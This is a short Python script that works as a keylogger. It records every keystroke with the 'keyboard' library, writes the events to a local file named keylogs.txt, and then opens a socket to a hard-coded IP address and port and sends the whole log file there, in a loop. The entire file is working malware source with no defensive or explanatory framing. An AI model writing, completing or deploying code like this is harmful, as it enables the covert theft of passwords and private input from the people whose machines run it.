import socket
import os
import keyboard

def main():
    log_file = 'keylogs.txt'
    server_ip = '192.168.122.182'
    port = 9000

    # Create and open log file in the same directory as script
    if not os.path.exists(log_file):
        with open(log_file, 'w') as f:
            pass

    while True:
        try:
            # Check for key presses
            for event in keyboard.record(until='esc'):
                if event.name == 'esc':
                    break
                else:
                    with open(log_file, 'a') as f:
                        f.write(str(event))
                        print(f"Key {str(event)} logged.")

            # Send log file to server
            with socket.socket() as s:
                s.connect((server_ip, port))
                with open(log_file, 'rb') as f:
                    data = f.read()
                    s.sendall(data)
                print(f"File sent to {server_ip}:{port}")
        except Exception as e:
            print(f"Error occurred: {e}")
            break

if __name__ == '__main__':
    main()